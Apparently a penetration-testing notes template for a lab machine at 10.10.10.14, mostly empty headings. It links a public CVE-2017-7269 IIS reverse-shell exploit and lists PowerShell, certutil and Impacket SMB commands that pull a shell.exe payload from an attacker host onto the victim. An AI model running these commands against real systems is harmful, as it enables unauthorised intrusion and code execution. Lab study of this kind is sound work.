# Information gathering

## Port Scan

``` bash
10.10.10.14
```

## Service Enumerate

### Web Enumerate

### Service 2


## Password Crack
### john

### hydra


# Exploit

## Initial Foothold
```shellcode
https://raw.githubusercontent.com/k4u5h41/CVE-2017-7269/main/ii6_reverse_shell.py
```
### Exploit method

### Vulnerability Explanation

### Exp code or link

### Proof screen shot
![[Pasted image 20230201094837.png]]


## Lateral Movement
```
powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.14.2:8888/shell.exe','c:\windows\system32\inetsrv\shell.exe')

certutil.exe -urlcache  -f http://10.10.14.2:8888/shell.exe shell.exe

```
### Exploit method

```
transfer file 
# SMB

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## Start Impacket SMB Server (With SMB2 Support)

`impacket-smbserver -smb2support server_name /var/www/html`

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## List Drives (Execute on Victim)

`net view \\192.168.0.1`

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## Copy Files (Execute on Victim)

`copy \\10.10.14.2\SERVER_NAME\shell.exe shell.exe`
```

### Exp code or link

### Proof screen shot


## Privilege Escalation

### Exploit method

### Exp code or link

### Proof screen shot